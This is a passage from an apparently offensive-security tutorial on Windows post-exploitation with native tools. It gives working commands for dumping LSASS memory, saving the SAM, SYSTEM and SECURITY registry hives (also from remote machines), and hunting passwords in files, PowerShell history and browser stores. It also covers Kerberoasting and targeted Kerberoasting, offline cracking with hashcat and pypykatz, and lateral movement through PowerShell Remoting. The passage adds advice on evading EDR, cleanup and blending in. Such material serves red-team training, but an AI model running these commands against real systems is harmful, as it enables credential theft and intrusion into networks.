system\nGet-WmiObject -Class Win32_ComputerSystem -ComputerName TARGET-PC |\n    Select-Object Name, UserName\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis only shows the currently logged-in user, but it's useful for targeting systems where specific users are active.\u003c/p\u003e\n\u003cp\u003eOne of the most useful WMI queries is checking what services are running:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List services on remote system\nGet-WmiObject -Class Win32_Service -ComputerName TARGET-PC |\n    Select-Object Name, State, StartMode, PathName, StartName |\n    Where-Object {$_.State -eq \"Running\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis shows what's actively running, what account services run as, and their executable paths. Services running as privileged accounts are interesting because if I can execute code in that service's context, I inherit those privileges.\u003c/p\u003e\n\u003ch2\u003eCredential Access and Harvesting\u003c/h2\u003e\n\u003cp\u003eNow we get to one of the most critical phases of post-exploitation - getting credentials. Without additional credentials, you're limited to what your initial foothold account can access. But with additional credentials, especially privileged ones, you can move laterally, escalate privileges, and access sensitive systems.\u003c/p\u003e\n\u003cp\u003eLet me walk you through the various ways to extract credentials using only native Windows tools.\u003c/p\u003e\n\u003ch3\u003eThe LSASS Memory Dumping Technique\u003c/h3\u003e\n\u003cp\u003eLSASS (Local Security Authority Subsystem Service) is the process responsible for enforcing security policy on Windows systems. It handles user authentication, Active Directory interactions, and critically for us, it caches credentials in memory. When a user logs into a system, their credentials - including NTLM hashes and sometimes cleartext passwords - end up in LSASS memory.\u003c/p\u003e\n\u003cp\u003eThe classic tool for extracting credentials from LSASS is Mimikatz, but as I mentioned earlier, uploading Mimikatz is a great way to get caught immediately. The good news is we can create a memory dump of the LSASS process using only native Windows tools, then parse that dump offline where defenders can't see us.\u003c/p\u003e\n\u003cp\u003eHere's the technique that changed everything for me:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eüö® EDR REALITY CHECK (2025):\u003c/strong\u003e This technique is \u003cstrong\u003eextremely loud\u003c/strong\u003e on modern EDRs. CrowdStrike, Defender ATP, SentinelOne, and Carbon Black all have specific detections for comsvcs.dll being used to dump LSASS memory. The process tree (rundll32 ‚Üí comsvcs ‚Üí LSASS access) is a well-known indicator. Touching LSASS memory is considered \"straight-up suicide\" in mature environments. To use this technique in 2025, you'd need: PPL bypass, direct syscalls to avoid hooks, process injection to hide the call chain, or custom memory access techniques. This works great in labs and legacy environments, but expect immediate alerts in hardened corporate networks.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# First, get the process ID of LSASS\n$lsass = Get-Process lsass\n$lsassPid = $lsass.Id\n\n# Dump LSASS memory using comsvcs.dll and rundll32\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsassPid C:\\temp\\lsass.dmp full\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLet me explain what's happening here. The comsvcs.dll library is a legitimate Windows component - it's part of the Component Services system. One of its functions, MiniDump, is designed to create memory dumps of processes for debugging purposes. It's a legitimate administrative function that IT support staff use when troubleshooting application crashes.\u003c/p\u003e\n\u003cp\u003eWhen you run this command, rundll32.exe (another legitimate Windows binary) calls the MiniDump function from comsvcs.dll and tells it to dump the memory of process ID $lsassPid (which is LSASS) to the file C:\\temp\\lsass.dmp with the 'full' flag (which means include all memory, not just a minidump).\u003c/p\u003e\n\u003cp\u003eThe beautiful thing about this technique is that every component is legitimate. Rundll32.exe is signed by Microsoft and present on every Windows system. The comsvcs.dll library is also signed by Microsoft and is a standard Windows component. Creating process dumps is a normal administrative task that IT support staff perform regularly for troubleshooting.\u003c/p\u003e\n\u003cp\u003eThe only thing that might raise suspicion is dumping LSASS specifically, but even that has legitimate uses - Microsoft Support sometimes asks administrators to create LSASS dumps for troubleshooting authentication issues.\u003c/p\u003e\n\u003cp\u003eImportant OPSEC considerations: This technique requires SeDebugPrivilege, which means you need to be running as an administrator or have that specific privilege. Also, some EDR solutions specifically watch for processes accessing LSASS memory or creating dumps of LSASS. It's not a guaranteed stealth technique, but it's significantly less obvious than running Mimikatz.\u003c/p\u003e\n\u003cp\u003eOnce you have the dump file, you need to exfiltrate it and parse it on your attacker machine. You can parse it with pypykatz (a Python implementation of Mimikatz):\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# On your attacker machine\npypykatz lsa minidump lsass.dmp\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis will extract all the credentials from the dump file - NTLM hashes, Kerberos tickets, cleartext passwords if they're present, and more.\u003c/p\u003e\n\u003cp\u003eAfter you've exfiltrated the dump, clean up:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Delete the dump file\nRemove-Item C:\\temp\\lsass.dmp -Force\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf you have GUI access to the system (maybe through RDP), there's an even simpler method that users of Windows legitimately use all the time:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eOpen Task Manager (Ctrl+Shift+Esc or run taskmgr.exe)\u003c/li\u003e\n\u003cli\u003eGo to the Details tab\u003c/li\u003e\n\u003cli\u003eFind \"Local Security Authority Process\" or lsass.exe\u003c/li\u003e\n\u003cli\u003eRight-click and select \"Create dump file\"\u003c/li\u003e\n\u003cli\u003eTask Manager will create the dump and show you the path\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThis is completely legitimate system administration behavior. IT support creates process dumps all the time for troubleshooting.\u003c/p\u003e\n\u003ch3\u003eRegistry Credential Extraction\u003c/h3\u003e\n\u003cp\u003eWindows stores local account password hashes in the SAM (Security Account Manager) registry hive. These hashes are encrypted with a key stored in the SYSTEM registry hive. If you can extract both of these hives, you can decrypt the password hashes offline.\u003c/p\u003e\n\u003cp\u003eHere's how to extract these registry hives using the built-in reg.exe utility:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eüö® EDR REALITY CHECK (2025):\u003c/strong\u003e Registry hive dumps of SAM/SYSTEM/SECURITY are \u003cstrong\u003ewell-known attack indicators\u003c/strong\u003e with straightforward detection rules in modern EDRs. Most security products flag \u003ccode\u003ereg save\u003c/code\u003e operations on these specific hives. The combination of all three being extracted in succession is especially suspicious. This technique works in lab environments and systems without EDR, but will trigger alerts in monitored environments. Consider alternative approaches like registry parsing in-memory or using Volume Shadow Copy techniques with additional obfuscation.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Save the SAM hive\nreg save HKLM\\SAM C:\\temp\\sam.hive\n\n# Save the SYSTEM hive (contains the encryption key)\nreg save HKLM\\SYSTEM C:\\temp\\system.hive\n\n# Also save SECURITY for cached domain credentials\nreg save HKLM\\SECURITY C:\\temp\\security.hive\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThese commands use the reg.exe utility, which is the standard Windows registry manipulation tool. The 'save' operation creates a backup copy of the specified registry hive. This is a completely legitimate administrative operation - system administrators back up registry hives all the time before making system changes.\u003c/p\u003e\n\u003cp\u003eHowever, there's an important requirement: you need administrator privileges to access these registry hives. Windows protects them specifically because they contain sensitive security information.\u003c/p\u003e\n\u003cp\u003eOnce you have these files, exfiltrate them to your attacker machine and parse them:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# On your attacker machine, use secretsdump from Impacket\nsecretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis will extract local account password hashes from the SAM hive, LSA secrets from the SECURITY hive (which can include service account passwords, auto-logon credentials, and more), and cached domain credentials from SECURITY (these are hashes of domain credentials for users who have logged into this machine).\u003c/p\u003e\n\u003cp\u003eThe cached domain credentials are particularly interesting. Windows caches the last 10 domain logins (by default) so that users can log in even when the domain controller is unavailable. These cached credentials are hashed, but they can be cracked offline if the passwords are weak.\u003c/p\u003e\n\u003cp\u003eFor remote systems where you have administrative access, you can extract registry hives over the network if the RemoteRegistry service is running:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Check if RemoteRegistry service is running on target\nGet-Service -Name RemoteRegistry -ComputerName TARGET-PC\n\n# Start it if it's not running\nGet-Service -Name RemoteRegistry -ComputerName TARGET-PC | Start-Service\n\n# Connect to remote registry and save hives\nreg save \\\\TARGET-PC\\HKLM\\SAM C:\\temp\\remote_sam.hive\nreg save \\\\TARGET-PC\\HKLM\\SYSTEM C:\\temp\\remote_system.hive\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBe aware that starting RemoteRegistry can be logged and might trigger alerts in monitored environments.\u003c/p\u003e\n\u003ch3\u003eSearching for Credentials in Files\u003c/h3\u003e\n\u003cp\u003eOne of the most successful credential harvesting techniques is simply searching for credentials stored in files. You'd be surprised how often administrators, developers, and users store passwords in plaintext files - scripts, configuration files, documentation, notes.\u003c/p\u003e\n\u003cp\u003eHere's how I systematically search for credentials:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Search for files that might contain passwords\nGet-ChildItem C:\\ -Recurse -Include *.txt,*.xml,*.ini,*.config,*.ps1,*.bat,*.cmd -ErrorAction SilentlyContinue |\n    Select-String -Pattern \"password\" -CaseSensitive:$false |\n    Group-Object Path |\n    Select-Object Name\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis recursively searches the C: drive for text files, XML files, configuration files, and scripts that contain the word \"password\". The Group-Object Path part prevents duplicate results for files with multiple matches.\u003c/p\u003e\n\u003cp\u003eLet me be more specific about high-value targets:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Look for unattended installation files (often contain admin credentials)\nGet-ChildItem C:\\Windows\\Panther\\ -Recurse -Include unattend.xml,autounattend.xml -ErrorAction SilentlyContinue\n\n# Check for Group Policy Preferences files (can contain passwords)\nGet-ChildItem C:\\Windows\\SYSVOL\\ -Recurse -Include Groups.xml,Services.xml,Scheduledtasks.xml,DataSources.xml,Printers.xml,Drives.xml -ErrorAction SilentlyContinue\n\n# Look for VNC server password files\nGet-ChildItem C:\\ -Recurse -Include ultravnc.ini,vnc.ini -ErrorAction SilentlyContinue\n\n# Search for database connection strings\nGet-ChildItem C:\\inetpub\\ -Recurse -Include web.config -ErrorAction SilentlyContinue |\n    Select-String -Pattern \"connectionString\"\n\n# Look for FileZilla saved credentials\nGet-ChildItem C:\\Users\\*\\AppData\\Roaming\\FileZilla\\ -Include sitemanager.xml,recentservers.xml -ErrorAction SilentlyContinue\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLet me explain why each of these is valuable:\u003c/p\u003e\n\u003cp\u003eUnattended installation files (unattend.xml) are used for automated Windows deployments. They often contain local administrator passwords in base64-encoded or even cleartext form. If your organization uses automated deployment, there's a good chance these files are still on systems.\u003c/p\u003e\n\u003cp\u003eGroup Policy Preferences (GPP) files used to be a gold mine until Microsoft patched them. Prior to MS14-025, Group Policy could deploy local user accounts with passwords, and these passwords were encrypted with a published AES key. Even though Microsoft patched this, older environments might still have these files lying around with credentials.\u003c/p\u003e\n\u003cp\u003eVNC configuration files store passwords that are often weakly encrypted or in plaintext.\u003c/p\u003e\n\u003cp\u003eWeb.config files for ASP.NET applications contain database connection strings, which include SQL Server credentials. These are often highly privileged accounts.\u003c/p\u003e\n\u003cp\u003eFileZilla, a popular FTP client, stores server credentials including passwords in XML files. If someone uses FileZilla to connect to servers, you get their FTP credentials.\u003c/p\u003e\n\u003ch3\u003ePowerShell History Mining\u003c/h3\u003e\n\u003cp\u003ePowerShell maintains a command history file, and administrators often type credentials directly into PowerShell commands when running scripts or making one-off connections. This history is stored in a plaintext file for each user.\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Get the PowerShell history path for current user\n$historyPath = (Get-PSReadlineOption).HistorySavePath\n\n# Read the history file\nGet-Content $historyPath\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn my experience, this has been successful more often than you might expect. I've found credentials for service accounts, SQL Server connections, remote systems, and even domain administrator accounts in PowerShell history.\u003c/p\u003e\n\u003cp\u003eTo check all user history files on the system (requires admin):\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Search all users' PowerShell history\nGet-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt -ErrorAction SilentlyContinue |\n    ForEach-Object {\n        Write-Output \"`n=== History for $($_.FullName) ===\"\n        Get-Content $_.FullName | Select-String -Pattern \"password|credential|username|pwd\" -CaseSensitive:$false\n    }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis searches every user's PowerShell history for lines containing credential-related keywords.\u003c/p\u003e\n\u003ch3\u003eBrowser Credential Extraction\u003c/h3\u003e\n\u003cp\u003eModern browsers store saved passwords, and while they're encrypted, the encryption keys are available to the user's account. With native tools, you can't easily decrypt browser passwords directly, but you can access the browser's credential storage.\u003c/p\u003e\n\u003cp\u003eFor Chrome, passwords are stored in a SQLite database:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Chrome password database location\n$chromePath = \"$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\"\n\n# Copy the database (can't read it directly as Chrome locks it)\nCopy-Item $chromePath C:\\temp\\ChromePasswords.db\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eYou'd then need to exfiltrate this database and decrypt it offline. The decryption requires the user's DPAPI master key, which can be extracted with the LSASS dump we created earlier.\u003c/p\u003e\n\u003ch3\u003eCached Domain Credentials\u003c/h3\u003e\n\u003cp\u003eWindows caches domain credentials to allow users to log in when domain controllers are unavailable. These are stored in the SECURITY registry hive and can be extracted:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Extract the SECURITY hive (already covered this)\nreg save HKLM\\SECURITY C:\\temp\\security.hive\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen you parse this with secretsdump or other tools, you'll get the cached credentials. These are salted and hashed, but if the passwords are weak, they can be cracked.\u003c/p\u003e\n\u003cp\u003eThe format is different from NTLM hashes - they're MS Cache v2 hashes. You'd crack them with hashcat using mode 2100:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003ehashcat -m 2100 -a 0 hashes.txt wordlist.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eCredential Manager and DPAPI\u003c/h3\u003e\n\u003cp\u003eWindows Credential Manager stores saved credentials for network shares, RDP connections, and other applications. These credentials are protected by DPAPI (Data Protection API), which encrypts them using keys derived from the user's password.\u003c/p\u003e\n\u003cp\u003eTo view what's in Credential Manager:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List stored credentials\ncmdkey /list\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis shows you what credentials are saved, but not the actual passwords. To extract the passwords, you'd need to decrypt the DPAPI-protected credential files, which requires either the user's password or their DPAPI master key (which you can get from the LSASS dump).\u003c/p\u003e\n\u003cp\u003eThe credential files are stored in:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Credential Manager files location\nGet-ChildItem C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\ -ErrorAction SilentlyContinue\nGet-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\ -ErrorAction SilentlyContinue\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eKerberoasting: Extracting Service Account Credentials\u003c/h3\u003e\n\u003cp\u003eKerberoasting is one of my favorite credential harvesting techniques because it's completely stealthy and can be done with nothing but native Windows tools. Let me explain what makes this technique so powerful.\u003c/p\u003e\n\u003cp\u003eIn Active Directory environments, services that run under domain accounts (like SQL Server, IIS application pools, or custom services) need a way for clients to authenticate to them. This is handled through Service Principal Names (SPNs). When a user wants to access a service, their computer requests a service ticket (TGS - Ticket Granting Service ticket) from the domain controller. Here's the critical part: that service ticket is encrypted with the password hash of the service account.\u003c/p\u003e\n\u003cp\u003eWhat makes this exploitable is that any authenticated domain user can request a service ticket for any service in the domain. Once you have that ticket, you can take it offline and crack it at your leisure. The domain controller doesn't care who requests tickets or why - it's a normal part of Kerberos authentication. And since you're cracking the ticket offline, there's no account lockout risk. You can try billions of passwords without anyone knowing.\u003c/p\u003e\n\u003cp\u003eLet me walk you through the complete process using only native Windows tools.\u003c/p\u003e\n\u003cp\u003eFirst, we already covered finding accounts with SPNs in the enumeration section, but let me show you again with more context:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Find all user accounts with SPNs registered\n$searcher = [ADSISearcher]\"(\u0026#x26;(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))\"\n$searcher.PropertiesToLoad.AddRange(@(\"samaccountname\",\"serviceprincipalname\",\"pwdlastset\"))\n$results = $searcher.FindAll()\n\nforeach ($result in $results) {\n    $username = $result.Properties['samaccountname'][0]\n    $spn = $result.Properties['serviceprincipalname'][0]\n    $pwdLastSet = [DateTime]::FromFileTime([Int64]$result.Properties['pwdlastset'][0])\n\n    Write-Output \"Username: $username\"\n    Write-Output \"SPN: $spn\"\n    Write-Output \"Password Last Set: $pwdLastSet\"\n    Write-Output \"---\"\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis query returns all user accounts (not computer accounts) that have SPNs. The pwdlastset field is interesting because accounts with old passwords are more likely to have weak passwords that you can crack.\u003c/p\u003e\n\u003cp\u003eNow comes the actual Kerberoasting - requesting the service tickets. I'm going to use the built-in .NET Framework classes that are available on every Windows system:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Request TGS tickets for all discovered SPNs\nAdd-Type -AssemblyName System.IdentityModel\n\nforeach ($result in $results) {\n    $spn = $result.Properties['serviceprincipalname'][0]\n    $username = $result.Properties['samaccountname'][0]\n\n    try {\n        Write-Output \"[*] Requesting ticket for $spn ($username)\"\n        $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn\n        Write-Output \"[+] Ticket requested successfully\"\n    }\n    catch {\n        Write-Output \"[-] Failed to request ticket: $($_.Exception.Message)\"\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis code loads the System.IdentityModel assembly (built into .NET Framework) and uses the KerberosRequestorSecurityToken class to request service tickets. This is exactly what happens when legitimate applications access Kerberos-authenticated services - we're just doing it manually.\u003c/p\u003e\n\u003cp\u003eAfter running this, the tickets are cached in memory. You can verify they're there using the built-in klist command:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# List all cached Kerberos tickets\nklist\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eYou'll see output like:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e#0\u003e     Client: user @ DOMAIN.LOCAL\n        Server: MSSQLSvc/sql01.domain.local:1433 @ DOMAIN.LOCAL\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n        Ticket Flags 0x40a50000 -\u003e forwardable renewable pre_authent ok_as_delegate name_canonicalize\n        Start Time: 11/28/2025 10:30:45\n        End Time:   11/28/2025 20:30:45\n        Renew Time: 12/5/2025 10:30:45\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe encryption type is important - older accounts might use RC4-HMAC, which is weaker and faster to crack. Modern accounts use AES-256, which is much stronger.\u003c/p\u003e\n\u003cp\u003eNow we need to extract these tickets so we can crack them offline. This is where it gets a bit tricky with only native tools. The tickets are stored in LSASS memory, and we need to export them in a format that cracking tools understand.\u003c/p\u003e\n\u003cp\u003eThe most straightforward way with native tools is to use Mimikatz's functionality, but since we're trying to stay native, we can export them through the LSASS dump we already created earlier:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# If you haven't already dumped LSASS, do it now\n$lsass = Get-Process lsass\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsass.Id C:\\temp\\lsass.dmp full\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThen on your attacker machine, you can extract the Kerberos tickets from the LSASS dump using pypykatz:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# On your attacker machine\npypykatz lsa minidump lsass.dmp -k kerberos_tickets\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis extracts the tickets in a format you can crack with hashcat or John the Ripper.\u003c/p\u003e\n\u003cp\u003eAlternatively, if you want to export tickets in a more targeted way, you can use PowerShell to access the Windows API directly. Here's a more advanced technique that extracts the ticket in Kirbi format (which can be converted to crackable format):\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# This requires more complex P/Invoke code, but here's the concept\n# Note: This is significantly more complex and typically requires additional tooling\n# Most practitioners use the LSASS dump method above\n\n# Export tickets using klist\nklist tickets \u003e C:\\temp\\tickets.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003eklist\u003c/code\u003e output isn't directly crackable, but it shows you what tickets you have. To actually crack them, you need the raw ticket data from LSASS.\u003c/p\u003e\n\u003cp\u003eOnce you have the tickets extracted on your attacking machine, crack them with hashcat:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Crack the extracted tickets\n# Mode 13100 for Kerberos 5 TGS-REP (AES256)\n# Mode 19700 for Kerberos 5 TGS-REP (AES128)\n# Mode 18200 for Kerberos 5 AS-REP etype 23\n\nhashcat -m 13100 -a 0 tickets.txt /path/to/wordlist.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf you successfully crack the password, you now have valid credentials for that service account. Service accounts often have elevated privileges - SQL Server service accounts frequently have sysadmin rights on the database server, and some service accounts are even members of Domain Admins.\u003c/p\u003e\n\u003cp\u003eOne more advanced technique - if you have GenericWrite, GenericAll, or WriteDacl permissions on a user account, you can set an SPN on that account yourself, then Kerberoast it. This is useful when there aren't many existing SPNs in the environment:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Set an SPN on an account you have write access to\n# This requires the ActiveDirectory module or direct LDAP manipulation\nSet-ADUser -Identity targetuser -ServicePrincipalNames @{Add=\"HTTP/fake.domain.local\"}\n\n# Request ticket for the SPN you just added\n$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/fake.domain.local\"\n\n# After extracting and cracking, clean up\nSet-ADUser -Identity targetuser -ServicePrincipalNames @{Remove=\"HTTP/fake.domain.local\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis technique is called \"Targeted Kerberoasting\" and is particularly useful when the user you have control over has a weak password but doesn't have an SPN by default.\u003c/p\u003e\n\u003ch2\u003eLateral Movement Techniques\u003c/h2\u003e\n\u003cp\u003eOnce you have credentials - whether from LSASS dumps, registry extraction, or file searches - it's time to move laterally through the network. Lateral movement is how you go from that initial foothold on one workstation to controlling multiple systems and ultimately reaching your objectives.\u003c/p\u003e\n\u003cp\u003eThe key to successful lateral movement is blending in with normal network traffic. Administrators move between systems all the time using legitimate tools and protocols. If you use those same tools and protocols, your activity looks like normal IT operations.\u003c/p\u003e\n\u003ch3\u003ePowerShell Remoting: The Modern Way\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eüö® EDR REALITY CHECK (2025):\u003c/strong\u003e WMI remote execution and Invoke-Command are increasingly monitored in restricted corporate environments with mature security programs. While these techniques are legitimate admin tools (which is why they're not universally blocked), behavioral analytics now flag unusual patterns: connections from non-admin accounts, connections outside business hours, rapid sequential connections to multiple hosts, or connections from unexpected source systems. These are still more stealthy than PsExec or other third-party tools, but they're not invisible. Advanced monitoring solutions log WinRM activity and PowerShell Remoting sessions for forensic analysis.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003ePowerShell Remoting is the modern standard for Windows system administration. It replaced older tools like PsExec and telnet for remote management. In any well-managed Windows environment, PowerShell Remoting is enabled on servers and increasingly on workstations.\u003c/p\u003e\n\u003cp\u003ePowerShell Remoting uses WinRM (Windows Remote Management) protocol, which runs over HTTP/HTTPS on ports 5985/5986. The traffic is encrypted, and from a network monitoring perspective, it looks like legitimate remote administration.\u003c/p\u003e\n\u003cp\u003eLet me show you how I use PowerShell Remoting for lateral movement:\u003c/p\u003e\n\u003cp\u003eFirst, check if a target system has PowerShell Remoting enabled:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Test if WinRM is accessible on the target\nTest-WSMan -ComputerName TARGET-PC\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf this returns system information, PowerShell Remoting is available. If it fails, the system either doesn't have WinRM enabled, it's blocked by a firewall, or you don't have permission to connect.\u003c/p\u003e\n\u003cp\u003eFor an interactive session on the remote system:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Start an interactive PowerShell session on remote system\nEnter-PSSession -ComputerName TARGET-PC -Credential (Get-Credential)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis prompts you for credentials and then drops you into a PowerShell session on the remote system. Anything you type is executed on the target. Your prompt changes to indicate you're in a remote session:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e[TARGET-PC]: PS C:\\Users\\admin\\Documents\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is useful for interactive exploration, but in a real engagement, interactive sessions create longer-lived connections that are more likely to be noticed. I prefer one-off command execution:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Execute a single command remotely\nInvoke-Command -ComputerName TARGET-PC -ScriptBlock { whoami }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe ScriptBlock contains the PowerShell code you want to execute. This could be a single command like \u003ccode\u003ewhoami\u003c/code\u003e or a complex script. The command executes, returns the output, and closes the connection immediately.\u003c/p\u003e\n\u003cp\u003eFor better OPSEC, you want to avoid entering credentials interactively because it might trigger logging or prompts. If you have credentials (maybe from a previous compromise), create a credential object:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Create a credential object\n$password = ConvertTo-SecureString \"P@ssw0rd123\" -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential (\"DOMAIN\\username\", $password)\n\n# Use the credential object\nInvoke-Command -ComputerName TARGET-PC -Credential $cred -ScriptBlock {\n    # Your code here\n    Get-Process\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOne of the most powerful aspects of PowerShell Remoting is that you can target multiple systems simultaneously:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Execute command on multiple systems\n$targets = @(\"TARGET-PC1\", \"TARGET-PC2\", \"TARGET-PC3\")\nInvoke-Command -ComputerName $targets -Credential $cred -ScriptBlock {\n    Get-LocalGroupMember -Group \"Administrators\"\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis runs the command on all three systems in parallel and returns the results. The output includes a PSComputerName property so you know which system each result came from.\u003c/p\u003e\n\u003cp\u003eYou can also run local scripts on remote systems:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Execute a local script file on remote systems\nInvoke-Command -ComputerName TARGET-PC -FilePath C:\\scripts\\enumeration.ps1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis reads the local script file, sends it to the remote system, and executes it there. The script never touches disk on the remote system - it executes entirely in memory.\u003c/p\u003e\n\u003cp\u003eA few important considerations about PowerShell Remoting:\u003c/p\u003e\n\u003cp\u003eFirst, it requires the target system to have WinRM enabled and configured. On servers (Windows Server 2012 and later), it's enabled by default. On workstations, it usually needs to be manually enabled or enabled via Group Policy.\u003c/p\u003e\n\u003cp\u003eSecond, it creates Windows Event Log entries on both the source and target systems. Event ID 4624 (successful logon) with logon type 3 (network) and Event ID 4648 (explicit credential use) are created. On the target, WinRM logs (Microsoft-Windows-WinRM/Operational) record the connection.\u003c/p\u003e\n\u003cp\u003eThird, there's the \"double-hop\" problem. When you connect to System A using credentials, and then try to access System B from System A, it fails because your credentials aren't passed along. This is by design for security, but it complicates lateral movement chains. The solution is CredSSP, but enabling it can be complex and requires configuration changes.\u003c/p\u003e\n\u003ch3\u003eUsing Harvested Credentials: Pass-the-Hash and Beyond\u003c/h3\u003e\n\u003cp\u003eNow that we've harvested credentials through various methods, let's talk about how to actually use them for lateral movement. This is where many people get confused because there are several different techniques depending on what kind of credentials you've obtained.\u003c/p\u003e\n\u003cp\u003eLet me clarify something important: true \"pass-the-hash\" (using only an NTLM hash without knowing the cleartext password) is actually very difficult with only native Windows tools. The Windows authentication architecture doesn't natively support authenticating with just a hash - it expects 